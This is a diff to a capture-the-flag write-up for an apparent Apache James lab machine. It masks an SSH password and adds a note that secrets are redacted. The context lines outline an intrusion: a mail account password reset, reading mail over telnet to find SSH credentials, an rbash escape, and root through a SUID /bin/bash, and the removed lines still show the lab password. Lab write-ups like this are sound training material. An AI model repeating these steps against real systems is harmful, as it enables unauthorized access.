@@ -20,7 +20,7 @@ Foothold (Apache James)
 ├── setpassword mindy writeup
 ├── telnet 10.129.1.53 110 → USER mindy / PASS writeup
 ├── LIST → RETR 2 → письмо от mailadmin
-│   └── mindy:P@55W0rd1!2@ (SSH creds)
+│   └── mindy:<PASSWORD> (SSH creds)
 └── ssh mindy@10.129.1.53 → user.txt
 
 Escaping rbash
@@ -35,6 +35,8 @@ Privilege Escalation
 ├── wait (cron) → ls -la /bin/bash → -rwsr-sr-x
 └── /bin/bash -ip → root.txt
 ```
+
+> Note: All flags, passwords, and hashes have been masked for ethical reasons.
 
 ---
 
@@ -114,14 +116,14 @@ RETR 2
 
 ```
 username: mindy
-pass: P@55W0rd1!2@
+pass: <PASSWORD>
 ```
 
 ### SSH
 
 ```bash
 ssh mindy@10.129.1.53
-# Password: P@55W0rd1!2@
+# Password: <PASSWORD>
 cat user.txt
 # <USER_FLAG>
 ```
